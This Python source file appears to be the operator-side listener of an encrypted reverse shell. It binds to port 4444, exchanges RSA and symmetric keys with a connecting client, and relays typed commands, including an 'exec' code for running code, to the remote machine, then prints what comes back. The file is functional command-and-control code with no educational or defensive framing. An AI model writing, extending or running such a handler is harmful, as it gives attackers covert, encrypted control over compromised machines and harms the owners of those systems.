import socket
from length import recv_length, send_length
from EnDeCrypt import generateAsymmetricalKeys, import_key, encryptStringSymmetrical, decryptStringSymmetrical, \
    decryptStringAsymmetrical

bind_ip = "127.0.0.1"
bind_port = 4444

public_key = b""
private_key = b""
cs_public_key = b""
symmetrical_key = b""

connection = socket.socket()
server_socket = socket.socket()
connection_errors = (ConnectionAbortedError, ConnectionResetError, ConnectionRefusedError, ValueError)  # == ConnectionError.__class__


def create_keys() -> (bytes, bytes): return generateAsymmetricalKeys()


def log(text: (str, bytes)):
    print(text)


def init_server():
    global server_socket
    server_socket.bind((bind_ip, bind_port))
    log(f"Bound on {bind_ip}:{bind_port}")
    server_socket.listen(2)
    log(f"Listening for 1 connection on {bind_ip}:{bind_port}")


def connect():
    global connection
    try:
        connection, address = server_socket.accept()
    except connection_errors:
        connection.close()
        log("Lost connection to client")
        exit(-1)


def recv_send_keys():
    global cs_public_key, symmetrical_key

    try:
        cs_public_key = import_key(connection.recv(271))
        connection.send(public_key.exportKey())
        symmetrical_key = decryptStringAsymmetrical(connection.recv(128), private_key)
    except connection_errors:
        connection.close()
        log("Lost connection to client")
        exit(-1)


class shell:
    received = None

    def recv(self):
        return decryptStringSymmetrical(connection.recv(recv_length(connection, symmetrical_key)), symmetrical_key).strip()

    def send(self, text: str):
        send_length(encryptStringSymmetrical(text, symmetrical_key), connection, symmetrical_key)
        connection.send(encryptStringSymmetrical(text, symmetrical_key))

    def run(self):
        code_list = {"exit": "CODE:EXIT", "exec": "CODE:EXEC"}
        command = None
        _command = None

        while command != "exit":
            command = input(self.recv() + ">").strip()
            if command == "":
                continue
            elif command.split()[0] in code_list.keys():
                if command == "exit":
                    self.send(code_list[command])
                    connection.close()
                    break
                else:
                    _command = command.split()
                    command = code_list[_command[0]] + command.replace(_command[0], "")

            self.send(command)
            self.received = self.recv()
            if self.received.count("\n") > 1:
                if self.received[0] != "\n":
                    self.received = "\n" + self.received
                if self.received[-1] != "\n":
                    self.received += "\n"
            print(self.received)


shell_instance = shell()

if __name__ == '__main__':
    private_key, public_key = create_keys()
    init_server()
    connect()
    recv_send_keys()
    try:
        shell_instance.run()
    except connection_errors:
        log("Lost connection to client")
        connection.close()
        exit(-1)
